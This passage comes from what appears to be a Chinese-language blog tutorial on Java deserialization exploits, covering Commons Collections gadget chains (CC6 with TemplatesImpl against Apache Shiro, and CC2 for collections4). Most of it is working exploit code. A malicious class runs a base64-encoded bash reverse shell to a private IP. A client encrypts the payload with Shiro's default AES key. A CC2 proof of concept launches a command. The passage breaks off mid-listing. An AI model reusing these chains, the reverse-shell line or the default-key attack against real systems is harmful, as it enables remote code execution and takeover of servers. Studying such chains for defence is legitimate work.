</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_name&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;HelloTemplatesImpl&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_name&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;HelloTemplatesImpl&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_tfactory&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TransformerFactoryImpl</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span> <span style=color:#111>transformer</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;getClass&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>innerMap</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>HashMap</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>outerMap</span> <span style=color:#f92672>=</span> <span style=color:#111>LazyMap</span><span style=color:#f92672>.</span><span style=color:#75af00>decorate</span><span style=color:#f92672>(</span><span style=color:#111>innerMap</span><span style=color:#f92672>,</span> <span style=color:#111>transformer</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>TiedMapEntry</span> <span style=color:#111>tme</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TiedMapEntry</span><span style=color:#f92672>(</span><span style=color:#111>outerMap</span><span style=color:#f92672>,</span> <span style=color:#111>obj</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>expMap</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>HashMap</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>expMap</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#111>tme</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;valuevalue&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>outerMap</span><span style=color:#f92672>.</span><span style=color:#75af00>clear</span><span style=color:#f92672>();</span>	<span style=color:#75715e>// 同outerMap.clear()
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>transformer</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;iMethodName&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;newTransformer&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>ByteArrayOutputStream</span> <span style=color:#111>barr</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayOutputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ObjectOutputStream</span> <span style=color:#111>oos</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectOutputStream</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>writeObject</span><span style=color:#f92672>(</span><span style=color:#111>expMap</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>barr</span><span style=color:#f92672>.</span><span style=color:#75af00>toByteArray</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>fieldName</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span> <span style=color:#111>value</span><span style=color:#f92672>)</span><span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Field</span> <span style=color:#111>field</span> <span style=color:#f92672>=</span> <span style=color:#111>obj</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#111>fieldName</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>field</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>field</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>value</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>};</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>恶意类</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#111>ysoserial.payloads</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.DOM</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>testCC6ShiroEvil</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>transform</span><span style=color:#f92672>(</span><span style=color:#111>DOM</span> <span style=color:#111>document</span><span style=color:#f92672>,</span> <span style=color:#111>SerializationHandler</span><span style=color:#f92672>[]</span> <span style=color:#111>handlers</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>TransletException</span> <span style=color:#f92672>{}</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>transform</span><span style=color:#f92672>(</span><span style=color:#111>DOM</span> <span style=color:#111>document</span><span style=color:#f92672>,</span> <span style=color:#111>DTMAxisIterator</span> <span style=color:#111>iterator</span><span style=color:#f92672>,</span> <span style=color:#111>SerializationHandler</span> <span style=color:#111>handler</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>TransletException</span> <span style=color:#f92672>{}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#75af00>Evil</span><span style=color:#f92672>()</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>super</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Hello TemplatesImpl&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Runtime</span><span style=color:#f92672>.</span><span style=color:#75af00>getRuntime</span><span style=color:#f92672>().</span><span style=color:#75af00>exec</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ==}|{base64,-d}|{bash,-i}&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>通过Client.java装配CC6Shiro</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#111>ysoserial.payloads</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javassist.ClassPool</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javassist.CtClass</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.shiro.crypto.AesCipherService</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.shiro.util.ByteSource</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>testCC6ShiroClient</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ClassPool</span> <span style=color:#111>pool</span> <span style=color:#f92672>=</span> <span style=color:#111>ClassPool</span><span style=color:#f92672>.</span><span style=color:#75af00>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>CtClass</span> <span style=color:#111>cls</span> <span style=color:#f92672>=</span> <span style=color:#111>pool</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>ysoserial</span><span style=color:#f92672>.</span><span style=color:#75af00>payloads</span><span style=color:#f92672>.</span><span style=color:#75af00>testCC6ShiroEvil</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>testCC6Shiro</span><span style=color:#f92672>().</span><span style=color:#75af00>getPayload</span><span style=color:#f92672>(</span><span style=color:#111>cls</span><span style=color:#f92672>.</span><span style=color:#75af00>toBytecode</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>AesCipherService</span> <span style=color:#111>aes</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>AesCipherService</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#111>key</span> <span style=color:#f92672>=</span> <span style=color:#111>java</span><span style=color:#f92672>.</span><span style=color:#75af00>util</span><span style=color:#f92672>.</span><span style=color:#75af00>Base64</span><span style=color:#f92672>.</span><span style=color:#75af00>getDecoder</span><span style=color:#f92672>().</span><span style=color:#75af00>decode</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>ByteSource</span> <span style=color:#111>ciphertext</span> <span style=color:#f92672>=</span> <span style=color:#111>aes</span><span style=color:#f92672>.</span><span style=color:#75af00>encrypt</span><span style=color:#f92672>(</span><span style=color:#111>payloads</span><span style=color:#f92672>,</span> <span style=color:#111>key</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>printf</span><span style=color:#f92672>(</span><span style=color:#111>ciphertext</span><span style=color:#f92672>.</span><span style=color:#75af00>toString</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>由于我在Linux上测试，就不弹计算器，直接弹shell</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302030308598.png alt=image-20220302030308598></p><p>效果拔群！！！！！！</p><p>这一节我们将<code>TemplatesImpl</code>和CC6结合在一起，同时解决了CC3高版本利用不了的问题</p><h2 id=cc2---cc4>CC2 - cc4</h2><p>CC反序列化利用链被提出时，cc依赖有以下两个版本，groupId和artifactId都不一样</p><ul><li>commons-collections:commons-collections</li><li>org.apache.commons:commons-collection4</li></ul><p>表现在我们构造exp的区别是将<code>decorate</code>改为了<code>LazyMap</code></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#111>Map</span> <span style=color:#75af00>decorate</span><span style=color:#f92672>(</span><span style=color:#111>Map</span> <span style=color:#111>map</span><span style=color:#f92672>,</span> <span style=color:#111>Transformer</span> <span style=color:#111>factory</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>return</span> <span style=color:#00a8c8>new</span> <span style=color:#111>LazyMap</span><span style=color:#f92672>(</span><span style=color:#111>map</span><span style=color:#f92672>,</span> <span style=color:#111>factory</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#f92672>&lt;</span><span style=color:#111>V</span><span style=color:#f92672>,</span> <span style=color:#111>K</span><span style=color:#f92672>&gt;</span> <span style=color:#111>LazyMap</span><span style=color:#f92672>&lt;</span><span style=color:#111>K</span><span style=color:#f92672>,</span> <span style=color:#111>V</span><span style=color:#f92672>&gt;</span> <span style=color:#75af00>LazyMap</span><span style=color:#f92672>(</span><span style=color:#00a8c8>final</span> <span style=color:#111>Map</span><span style=color:#f92672>&lt;</span><span style=color:#111>K</span><span style=color:#f92672>,</span> <span style=color:#111>V</span><span style=color:#f92672>&gt;</span> <span style=color:#111>map</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>final</span> <span style=color:#111>Transformer</span><span style=color:#f92672>&lt;?</span> <span style=color:#00a8c8>super</span> <span style=color:#111>K</span><span style=color:#f92672>,</span> <span style=color:#f92672>?</span> <span style=color:#00a8c8>extends</span> <span style=color:#111>V</span><span style=color:#f92672>&gt;</span> <span style=color:#111>factory</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>return</span> <span style=color:#00a8c8>new</span> <span style=color:#111>LazyMap</span><span style=color:#f92672>&lt;</span><span style=color:#111>K</span><span style=color:#f92672>,</span> <span style=color:#111>V</span><span style=color:#f92672>&gt;(</span><span style=color:#111>map</span><span style=color:#f92672>,</span> <span style=color:#111>factory</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>直接把gadget改一下名字即可；不过为了专门适配cc4，ysoserial也有专门的链子CC2和CC4</p><p>cc包之所以能找出这么多链子，除了相当基础以外，更多的原因在于它包含了很多可以执行任意方法的Transformer，所以找链子的过程相当于找一条从<code>Serializable#readObject</code>到<code>Transformer#transform</code>方法的调用链</p><p>我们分析一下CC2，它用到的关键类有<code>java.util.PriorityQueue</code>和<code>org.apache.commons.collections4.comparators.TransformingComparator</code>（可通过comprare调用transform）</p><p><code>java.util.PriorityQueue</code>重写了<code>readObject</code>方法</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>private</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>readObject</span><span style=color:#f92672>(</span><span style=color:#111>java</span><span style=color:#f92672>.</span><span style=color:#75af00>io</span><span style=color:#f92672>.</span><span style=color:#75af00>ObjectInputStream</span> <span style=color:#111>s</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>throws</span> <span style=color:#111>java</span><span style=color:#f92672>.</span><span style=color:#75af00>io</span><span style=color:#f92672>.</span><span style=color:#75af00>IOException</span><span style=color:#f92672>,</span> <span style=color:#111>ClassNotFoundException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Read in size, and any hidden stuff
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#75af00>defaultReadObject</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Read in (and discard) array length
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#75af00>readInt</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#111>SharedSecrets</span><span style=color:#f92672>.</span><span style=color:#75af00>getJavaOISAccess</span><span style=color:#f92672>().</span><span style=color:#75af00>checkArray</span><span style=color:#f92672>(</span><span style=color:#111>s</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span><span style=color:#f92672>[].</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>size</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>queue</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[</span><span style=color:#111>size</span><span style=color:#f92672>];</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Read in all elements.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>for</span> <span style=color:#f92672>(</span><span style=color:#00a8c8>int</span> <span style=color:#111>i</span> <span style=color:#f92672>=</span> <span style=color:#111>0</span><span style=color:#f92672>;</span> <span style=color:#111>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#111>size</span><span style=color:#f92672>;</span> <span style=color:#111>i</span><span style=color:#f92672>++)</span>
</span></span><span style=display:flex><span>        <span style=color:#111>queue</span><span style=color:#f92672>[</span><span style=color:#111>i</span><span style=color:#f92672>]</span> <span style=color:#f92672>=</span> <span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#75af00>readObject</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Elements are guaranteed to be in &#34;proper order&#34;, but the
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// spec has never explained what that might be.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#111>heapify</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><pre tabindex=0><code>heapify-&gt; siftDown-&gt; siftDownUsingComparator-&gt; comparator.compare-&gt; TransformingComparator-&gt; compare-&gt; transform
</code></pre><p>构造poc</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ByteArrayInputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ByteArrayOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectInputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Field</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Comparator</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.PriorityQueue</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections4.Transformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections4.functors.ChainedTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections4.functors.ConstantTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections4.functors.InvokerTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections4.comparators.TransformingComparator</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>CC2</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#111>fakeTransformers</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Transformer</span><span style=color:#f92672>[]{</span><span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>1</span><span style=color:#f92672>)};</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#111>transformers</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Transformer</span><span style=color:#f92672>[]{</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>Runtime</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;getMethod&#34;</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]{</span><span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>Class</span><span style=color:#f92672>[].</span><span style=color:#75af00>class</span><span style=color:#f92672>},</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[]{</span><span style=color:#d88200>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>]}</span>
</span></span><span style=display:flex><span>                <span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;invoke&#34;</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]{</span><span style=color:#111>Object</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>},</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[]{</span><span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>]}</span>
</span></span><span style=display:flex><span>                <span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;exec&#34;</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]{</span><span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>},</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>new</span> <span style=color:#111>String</span><span style=color:#f92672>[]{</span><span style=color:#d88200>&#34;calc.exe&#34;</span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>                <span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>1</span><span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span> <span style=color:#111>transformerChain</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ChainedTransformer</span><span style=color:#f92672>(</span><span style=color:#111>fakeTransformers</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Comparator</span> <span style=color:#111>comparator</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TransformingComparator</span><span style=color:#f92672>(</span><span style=color:#111>transformerChain</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>PriorityQueue</span> <span style=color:#111>queue</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>PriorityQueue</span><span style=color:#f92672>(</span><span style=color:#111>2</span><span style=color:#f92672>,</span> <span style=color:#111>comparator</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>queue</span><span style=color:#f92672>.</span><span style=color:#75af00>add</span><span style=color:#f92672>(</span><span style=color:#111>1</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>queue</span><span style=color:#f92672>.</span><span style=color:#75af00>add</span><span style=color:#f92672>(</span><span style=color:#111>2</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>transformerChain</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;iTransformers&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>transformers</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>ByteArrayOutputStream</span> <span style=color:#111>barr</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayOutputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ObjectOutputStream</span> <span style=color:#111>oos</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectOutputStream</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>);</span>
